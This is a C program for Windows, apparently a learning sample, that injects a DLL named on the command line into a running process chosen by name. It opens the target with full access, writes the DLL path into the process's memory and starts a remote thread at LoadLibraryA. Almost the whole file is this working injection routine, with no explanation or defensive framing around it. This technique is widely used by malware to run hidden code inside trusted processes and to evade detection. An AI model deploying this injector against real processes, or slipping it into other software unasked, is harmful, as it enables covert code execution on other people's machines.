#include <windows.h>
#include <stdio.h>
#include <Tlhelp32.h>
#include <stdbool.h>

// DLL Injection - Message Box

int main(int argc, char** argv){
    if(argc != 3){
        printf("usage: ./dll-injectior.exe <path-to-dll> <process-name>\n");
        return 1;
    }

    // DLL Path
    PCSTR dll_path = argv[1];

    // Process name as wide string
    wchar_t w_proc_name[MAX_PATH];
    mbstowcs(w_proc_name, argv[2], MAX_PATH);

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    // Get all running processes
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    Process32FirstW(snapshot, &pe32);

    bool found = FALSE;

    do{
        if(wcscmp(pe32.szExeFile, w_proc_name) == 0){
            HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
            if(hProcess == NULL){
                printf("Failed to retrieve handle to remote process: %d\n", GetLastError());
                return 1;
            }

            LPVOID alloc_mem = VirtualAllocEx(hProcess, NULL, strlen(dll_path) + 1, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
            if(alloc_mem == NULL){
                printf("Failed to allocate memory in remote process: %d\n", GetLastError());
                return 1;
            }
            printf("Memory allocated at %p\n", alloc_mem);

            WriteProcessMemory(hProcess, alloc_mem, dll_path, strlen(dll_path) + 1, NULL);

            HMODULE kernel32Base = GetModuleHandleW(L"kernel32.dll");
            if(kernel32Base == NULL){
                printf("Failed to retrieve handle to kernel32.dll: %d\n", GetLastError());
                return 1;
            }

            FARPROC load_library_address = GetProcAddress(kernel32Base, "LoadLibraryA");

            HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)load_library_address, alloc_mem, 0, NULL);
            if(hThread == NULL){
                printf("Failed to create thread in remote process: %d\n", GetLastError());
                return 1;
            }

            WaitForSingleObject(hThread, INFINITE);
            CloseHandle(hProcess);

            return 0;
        } 
    }while(Process32NextW(snapshot, &pe32));

    printf("Application not found\n");
    return 1;
}
